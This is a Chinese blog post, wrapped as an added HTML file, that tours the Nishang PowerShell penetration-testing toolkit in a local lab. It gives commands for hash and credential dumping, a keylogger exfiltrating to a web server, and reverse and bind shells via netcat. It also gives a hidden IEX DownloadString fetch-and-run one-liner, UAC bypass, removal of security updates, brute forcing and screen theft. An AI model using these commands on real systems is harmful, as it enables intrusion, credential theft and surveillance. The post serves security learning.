@@ -1,0 +1,225 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>PowerShell-Nishang - Guko's Blog</title><meta name="description" content="Nishang是一款针对PowerShell的渗透工具。基于PowerShell的渗透测试，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等0x01 Nishang简介Nishang要在PowerShell 3.0以上环境中可正常使用，windows7下是哟点小问题"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PowerShell-Nishang</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PowerShell-Nishang</h1><div class="post-meta">2020-04-08<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>Nishang是一款针对PowerShell的渗透工具。基于PowerShell的渗透测试，集成了框架、脚本和各种Payload，包括下载和执行、键盘记录、DNS、延时命令等</p>
+<a id="more"></a>
+
+<h4 id="0x01-Nishang简介"><a href="#0x01-Nishang简介" class="headerlink" title="0x01 Nishang简介"></a>0x01 Nishang简介</h4><p>Nishang要在PowerShell 3.0以上环境中可正常使用，windows7下是哟点小问题的</p>
+<p>Github项目地址：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
+<p>导入模块，查看命令查看Nishang有哪些模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy remotesigned //更改执行策略</span><br><span class="line">Import-Module .\nishang.psm1</span><br><span class="line">Get-Command -Module nishang</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/10.png" alt></p>
+<p>执行<code>Get-Information</code>可获取目标主机上的大量信息（FTP访问、进程、计算机配置信息、无线网络和设备的信息、Hosts信息）这里可看到列出本地的部分信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Information</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/1.png" alt></p>
+<p>另外在PowerShell中使用<code>Out-File</code>可以将执行结果导出到文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Information | Out-File test.txt //获取到的信息保存在test.txt</span><br></pre></td></tr></table></figure>
+
+<p>分别说一下Nishang目录结构中模块的功能</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/2.png" alt></p>
+<p><img src="/2020/04/08/PowerShell-Nishang/29.png" alt></p>
+<h4 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h4><p>这里对部分模块的功能做一个学习跟记录</p>
+<p><strong>1.Check-VM</strong></p>
+<p>它是用于检测当前的机器是否是一台已知的虚拟机的。它通过检测已知的一些虚拟机的指纹信息（如：Hyper-V, VMWare, Virtual PC, Virtual Box,Xen,QEMU）来识别,如下可看到是一台虚拟机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-help Check-VM //说明信息</span><br><span class="line">get-help Check-VM -examples //使用举例</span><br><span class="line">Check-VM //执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/3.png" alt></p>
+<p><strong>2.Invoke-CredentialsPhish</strong></p>
+<p>这个脚本用来欺骗用户，让用户输入密码，在不输入正确密码关闭不了对话框，只能强子结束进程</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/4.png" alt></p>
+<p>输入正确密码后</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/5.png" alt></p>
+<p><strong>3.Copy-VSS</strong></p>
+<p>这个脚本利用Volume Shadow Copy 服务来复制出SAM文件。如果这个脚本运行在了DC机上ntds.dit和SYSTEM hive也能被拷贝出来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy-VSS //将会直接把文件保存在当前路径下</span><br><span class="line">Copy-VSS -DestinationDir C:temp  //指定保存文件的路径（必须是已经存在的路径）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/6.png" alt></p>
+<p><strong>4.FireBuster FireListener</strong></p>
+<p>FireBuster可以对内网进行扫描，打开本地监听，然后远程传送数据，它会把包发给<code>FireListener</code></p>
+<p>在本机输入以为命令运行<code>FireListener</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FireListener 130-150</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/7.png" alt></p>
+<p>接着在目标机输入以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FireBuster 192.168.197.230 90-110 -Verbose</span><br></pre></td></tr></table></figure>
+
+<p>​    <img src="/2020/04/08/PowerShell-Nishang/8.png" alt><br><strong>5.Get-Information</strong></p>
+<p>这个脚本可以获取目标机器上大量的信息（FTP访问，进程，计算机配置信息，无线网络和设备的信息，Hosts信息等等非超丰富）,在简介部分已做演示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Information</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/1.png" alt></p>
+<p><strong>6.Get-PassHashes</strong></p>
+<p>在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PassHashes -PSObjectFormat //可以使用-PSObjectFormat来格式化输出结果</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/9.png" alt></p>
+<p><strong>7.Invoke-Mimikatz</strong></p>
+<p>Dump出Windows 8.1 and Server 2012的系统用户密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Mimikatz -DumpCerts // Dump出本机的凭证信息</span><br><span class="line">Invoke-MimikatzWDigestDowngrade // 会锁屏</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/11.png" alt></p>
+<p><strong>8.Keylogger键盘记录</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis  //-CheckURL参数会去检查所给出的网页之中是否包含 -MagicString后的字符串，如果存在的话就停止使用记录。</span><br><span class="line">.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器</span><br><span class="line">.\Keylogger.ps1 -persist //实现持久化记录（重启后依然进行记录）</span><br><span class="line">.\Keylogger.ps1 //直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/12.png" alt></p>
+<p>在Temp目录下key文件</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/13.png" alt></p>
+<p>当监听完成以后，我们需要用Gather目录下的Keylogger来解析Temp下的key.log文件，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse_Keys &quot;C:\Users\Admin\AppData\Local\Temp\key.log&quot; &quot;C:\Users\Admin\Desktop\test.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/14.png" alt></p>
+<p><strong>9.Get-PassHints</strong></p>
+<p>这个脚本可以从Windows获得用户的密码的提示信息，需要有Administrator的权限来读取SAM hive.可根据提示信息生成密码字典，提高爆破成功率。运气好用户直接将明文记录在提示信息中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PassHints</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-PowerShell隐藏通信隧道"><a href="#0x03-PowerShell隐藏通信隧道" class="headerlink" title="0x03 PowerShell隐藏通信隧道"></a>0x03 PowerShell隐藏通信隧道</h4><p><strong>1.基于TCP协议的PowerShell交互式Shell</strong></p>
+<p>都知道当目标在外网而你在内网的时候，用正向连接，当目标在内网你在外网的时候，用反向连接。如都在外网则无区别，两则都可</p>
+<p>反向连接：</p>
+<p>NC下执行 : </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+
+<p>在PowerShell下执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 192.168.197.234 -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/15.png" alt></p>
+<p>正向连接</p>
+<p>PowerShell下执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Bind -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p>NC下执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.197.196 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/16.png" alt></p>
+<p><strong>2.基于UDP协议的PowerShell交互式Shell</strong></p>
+<p>只是单纯的将Invoke-PowerShellTcp改为Invoke-PowerShellUdp，其他命令。之后就是nc的命令改变了</p>
+<p>正向连接:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvu 192.168.197.196 3333</span><br></pre></td></tr></table></figure>
+
+<p>PowerShell下执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellUdp -Bind -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/19.png" alt></p>
+<p>反向连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lup 3333</span><br></pre></td></tr></table></figure>
+
+<p>PowerShell下执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellUdp -Reverse -IPAddress 192.168.197.234 -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/18.png" alt></p>
+<p>对于一些命令的查询可以使用这个网站，非常好用:<a href="https://www.explainshell.com/" target="_blank" rel="noopener">https://www.explainshell.com/</a></p>
+<p><img src="/2020/04/08/PowerShell-Nishang/17.png" alt></p>
+<p><strong>3.基于HTTP和HTTPS协议的PowerShell交互式Shell</strong></p>
+<p>两种使用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP:Invoke-PoshRatHttp -IPAddress 192.168.197.196 -Port 3333</span><br><span class="line">HTTPS:Invoke-PoshRatHttps -IPAddress 192.168.12.103 -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p>先对HTTP进行测试</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/20.png" alt></p>
+<p>然后把生成的如下命令在目标机的cmd中执行，之后命令行消失，在本机Powershell下返回了一个会话，如上图的<code>3</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&apos;http://192.168.197.196:3333/connect&apos;))</span><br></pre></td></tr></table></figure>
+
+<p>http测试的时候未成功….</p>
+<p>还有ICMP shell DNS shell WMI shell之类的</p>
+<h4 id="0x04-webshell"><a href="#0x04-webshell" class="headerlink" title="0x04 webshell"></a>0x04 webshell</h4><p>存放于nishangAntak-WebShell目录下，就是一个ASPX的大马，但是命令行是PowerShell，比单纯的cmd强大很多。功能齐全</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/21.png" alt></p>
+<h4 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h4><p><strong>1.Bypass UAC</strong></p>
+<p>User Account Control(用户账户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能影响计算机运行或其他用户设置的操作之前，提供权限或管理员密码。通过这些操作执行前对其进行验证，在未经许可的情况下，UAC可以防止恶意软件和间谍润健在计算机上进行安装或对计算机进行更改</p>
+<p>在Windows Vista以及更高版本中，微软引进了安全控制策略，分为高、中、低三个等级。高等级进程具有管理员权限，中等级进程拥有一个基本用户的权限，低级别进程的权限受各种限制，用来保证系统受到威胁时，使损失最小</p>
+<p>UAC需要授权的动作包括：</p>
+<ul>
+<li>配置windows update</li>
+<li>增加或删除用户账户</li>
+<li>改变用户的账户类型</li>
+<li>改变UAC设置</li>
+<li>安装ActiveX</li>
+<li>安装或卸载程序</li>
+<li>安装设备驱动程序</li>
+<li>设置家长控制</li>
+<li>将文件移动或复制到Program Files 或Windows目录</li>
+<li>查看其他用户的文件夹</li>
+</ul>
+<p>UAC有4种设置要求：</p>
+<ul>
+<li>始终通知：最严格设置，任何时候，当有程序要使用高级别的权限时，都会提示本地用户</li>
+<li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。本地windows程序要使用高级别权限时，不通知用户。但当第三方程序要求使用高级别权限时，会提示本地用户。</li>
+<li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度):与上一条设置相同，但提示用户时不降低桌面的亮度</li>
+<li>从不提示：当系统为系统管理员时，所有程序都会以最高权限运行。</li>
+</ul>
+<p>Invoke-PsUACme 提供了一些绕过UAC的方式。这个模块用的是UACME项目的DLL来Bypass UAC。所以，方法对照表如下</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/22.png" alt></p>
+<p>输入命令查看帮助信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get-help Invoke-PsUACme</span><br><span class="line">get-help Invoke-PsUACme -examples</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/23.png" alt></p>
+<p>实例一: 使用Sysprep方法和默认的Payload执行</p>
+<p>实例二: 使用oobe方法跟默认的payload执行</p>
+<p>实例三: 使用oobe方法跟自制payload执行</p>
+<h4 id="0x06-其他功能"><a href="#0x06-其他功能" class="headerlink" title="0x06 其他功能"></a>0x06 其他功能</h4><p><strong>1.删除布丁</strong></p>
+<p>Remove-Update</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Remove-Update All //删除目标机器上的所有更新</span><br><span class="line">Remove-Update Security //删除目标机器上的所有与安全相关更新</span><br><span class="line">Remove-Update KB2761226 //移除指定编号的更新</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.端口扫描</strong></p>
+<p>Invoke-PortScan是端口扫描脚本，用于发现主机、解析主机</p>
+<p>Get-Help Invoke-PortScan -full 查看帮助信息</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/24.png" alt></p>
+<p>主要参数：</p>
+<p>-StartAddress 开始的IP地址</p>
+<p>-EndAddress 结束的IP地址</p>
+<p>-ResolveHost 是否解析主机名</p>
+<p>-ScanPort要不要进行端口扫描</p>
+<p>-Port 要扫描的端口（默认扫描端口：21,22,23,53,69,71,80,98,110,139,111,<br>389,443,445,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901）</p>
+<p>-TimeOut 超时时间</p>
+<p>对我本地局域网进行扫描命令如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PortScan -StartAddress 192.168.197.1 -EndAddress 192.168.197.254</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.197.1 -EndAddress 192.168.197.254 -ResolveHost</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/25.png" alt></p>
+<p><strong>3.弱口令爆破</strong></p>
+<p>Invoke-BruteForce暴力破解脚本，用于对SQL Server 域控制器、web及FTP弱口令爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-help Invoke-BruteForce -examples //查看帮助</span><br><span class="line">Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose //爆破域控制器</span><br><span class="line">Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose //爆破SQL Server</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/26.png" alt></p>
+<p>主要参数：</p>
+<p>-ComputerName 对应服务的计算机名</p>
+<p>-UserList 用户名字典</p>
+<p>-PasswordList 密码字典</p>
+<p>-Service 服务类型（默认为：SQL）</p>
+<p>-StopOnSuccess 匹配一个后停止</p>
+<p><strong>4.嗅探</strong></p>
+<p>动静太大</p>
+<p>在靶机上执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Interceptor -ProxyServer 192.168.197.196 -ProxyPort 9999</span><br></pre></td></tr></table></figure>
+
+<p>监听机器上执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 9999</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.屏幕窃取</strong></p>
+<p>Show-TargetScreen脚本使用MJPESG传输目标机远程桌面的实时画面，在本机可以使用NC或者PowerCat进行监听。在本地使用支持MJPEG的浏览器访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可</p>
+<p>反向连接窃取屏幕</p>
+<p>在目标机上执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show-TargetScreen -Reverse -IPAddress 192.168.197.234 -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p>NC下执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -nlvp 3333 | netcat -nlvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>访问攻击机器的9999端口，就可以窃取到屏幕</p>
+<p><img src="/2020/04/08/PowerShell-Nishang/27.png" alt></p>
+<p>正向连接窃取屏幕</p>
+<p>在目标机器上执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show-TargetScreen -Bind -Port 3333</span><br></pre></td></tr></table></figure>
+
+<p>在NC下执行:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -nv 192.168.197.196 3333 | netcat -lnvp 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/08/PowerShell-Nishang/28.png" alt></p>
+<h4 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h4><p>Nishang中集成了很多渗透脚本，可辅助我们在渗透当中使用，虽然在有些情况下并不能运行powershell。但是通过脚本的思路，可以自己去完成实现脚本的一些功能，本文仅仅做了一部分的介绍，更详细的请自行多多研究。</p>
+<p>参考资料</p>
+<p><a href="https://www.cnblogs.com/bonelee/p/8258440.html" target="_blank" rel="noopener">https://www.cnblogs.com/bonelee/p/8258440.html</a></p>
+<p><a href="https://blog.csdn.net/m0_37438418/article/details/80327624" target="_blank" rel="noopener">https://blog.csdn.net/m0_37438418/article/details/80327624</a></p>
+</div><!--文章标签--><div class="tags"><a href="/tags/PowerShell/">PowerShell</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 16px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/PowerShell/" style="font-size: 18px;">PowerShell</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/远程代码执行/" style="font-size: 16px;">远程代码执行</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/免杀/" style="font-size: 16px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 14px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/CVE-2020-10560-OSSN任意文件读取漏洞复现/">CVE-2020-10560-OSSN任意文件读取漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/08/PowerShell-Nishang/">PowerShell-Nishang</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/PowerShell-PowerSploit/">PowerShell-PowerSploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/01/SMBv3-1-1-CVE-2020-0796/">SMBv3.1.1_CVE-2020-0796</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/内网信息收集二/">内网信息收集二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/30/内网信息收集一/">内网信息收集一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/18/PowerShell-Empire/">PowerShell-Empire</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/17/免杀初探-Veil/">免杀初探-Veil</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/13/PowerShell基础/">PowerShell基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/免杀初探-msf自免杀/">免杀初探-msf自免杀</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
